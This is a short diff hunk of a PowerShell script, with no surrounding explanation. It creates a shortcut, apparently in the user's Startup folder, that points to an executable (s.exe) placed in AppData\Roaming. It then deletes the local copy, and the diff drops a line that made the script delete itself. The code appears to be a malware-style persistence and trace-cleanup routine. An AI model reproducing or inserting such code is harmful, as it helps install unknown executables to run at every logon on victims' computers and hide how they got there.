@@ -6,4 +6,3 @@ $Shortcut = $WshShell.CreateShortcut("C:\Users\$env:username\AppData\Roaming\Mic
 $Shortcut.TargetPath = "C:\Users\$env:username\AppData\Roaming\s.exe"
 $Shortcut.Save()
 Remove-Item s.exe
-Remove-Item .\shit.ps1
